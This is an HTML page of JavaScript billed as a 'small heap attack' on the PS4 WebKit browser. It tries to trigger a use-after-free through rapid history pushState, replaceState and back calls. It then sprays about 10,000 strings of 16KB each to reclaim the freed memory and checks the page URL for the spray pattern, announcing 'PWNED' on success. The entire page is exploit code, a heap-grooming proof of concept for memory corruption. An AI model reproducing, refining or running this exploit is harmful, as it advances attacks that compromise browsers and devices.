<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit - Small Heap Fragmentation</title>
<style>
    body { background-color: #000; color: #ff0000; font-family: monospace; padding: 20px; }
    button { 
        padding: 20px; width: 100%; margin-bottom: 10px;
        font-weight: bold; font-size: 16px; cursor: pointer; 
        border: 2px solid #f00; background: #200; color: #fff;
        text-transform: uppercase;
    }
    #log { border: 1px solid #555; margin-top: 20px; padding: 10px; white-space: pre-wrap; height: 350px; overflow-y: scroll;}
    .success { color: #fff; background-color: #aa0000; padding: 5px; font-weight: bold; font-size: 1.2em;}
</style>
</head>
<body>
<h2>PS4 WebKit - Small Heap Strategy (16KB)</h2>
<div id="status">Ready to fragment...</div>

<button onclick="runSmallReclaim()">START SMALL HEAP ATTACK</button>

<div id="log"></div>

<script>
const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");
function log(m, type="") { 
    const d = document.createElement("div");
    if(type) d.className = type;
    d.textContent = m;
    logEl.appendChild(d);
    logEl.scrollTop = logEl.scrollHeight;
}
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

var keepAlive = [];

async function runSmallReclaim() {
    logEl.innerHTML = "";
    keepAlive = []; 
    statusEl.innerText = "Running...";

    // === PHASE 1: TRIGGER UAF (MODIFIED FOR SMALL SIZE) ===
    log("1. Triggering UAF (Targeting ~16KB)...");
    
    // We drastically reduce the size to ensure it stays in Small/Medium Heap
    let size = 100;
    const STEP = 500; // Small increments
    const TARGET_SIZE_CHARS = 8000; // ~16KB in UTF-16

    for(let i = 0; i < 48; i++) {
        let frag = "V".repeat(size); 
        history.pushState({}, "", "#" + frag);
        history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
        
        if(i % 6 === 0) setTimeout(() => history.back(), 0);
        
        if(size < TARGET_SIZE_CHARS) size += STEP;
        await sleep(5); 
    }
    
    await sleep(50);

    // === PHASE 2: SPRAY SMALL STRINGS ===
    // Target: 8000 chars * 2 bytes = 16000 bytes (~16KB)
    // 16KB is a very standard size for bmalloc buckets.
    
    const SPRAY_LEN = 8000;
    const SPRAY_COUNT = 10000; // Massive spray to fill all holes
    
    statusEl.innerText = `2. Spraying ${SPRAY_COUNT} small strings...`;
    log(`Flooding heap with 16KB strings...`);

    for(let i=0; i < SPRAY_COUNT; i++) {
        // Create unique strings to force allocation
        let prefix = i.toString() + "_";
        let payload = "W".repeat(SPRAY_LEN - prefix.length);
        keepAlive.push(prefix + payload);
        
        if(i % 1000 === 0) await sleep(10);
    }

    log(`Spray Complete! Heap saturated.`);
    await sleep(200);

    // === PHASE 3: VERIFY ===
    statusEl.innerText = "3. Checking...";
    let url = document.URL;
    let changed = false;
    let sample = "";
    
    // Since the size is small, the 'V's might be fewer, but if reclaim happens, 'W' will be there.
    if(url.includes("W")) {
        changed = true;
        sample = "Detected 'W' pattern!";
    }

    if(changed) {
        log("!!! JACKPOT !!!", "success");
        log("Small Heap Reclaim Successful!");
        log(sample);
        statusEl.innerText = "PWNED: SMALL HEAP";
        statusEl.style.backgroundColor = "#ff0000";
    } else {
        log("Fail: Still seeing 'V'.");
        log("Current URL Length: " + url.length);
        log("If length is small (<1000), the UAF might not have triggered properly.");
    }
}
</script>
</body>
</html>
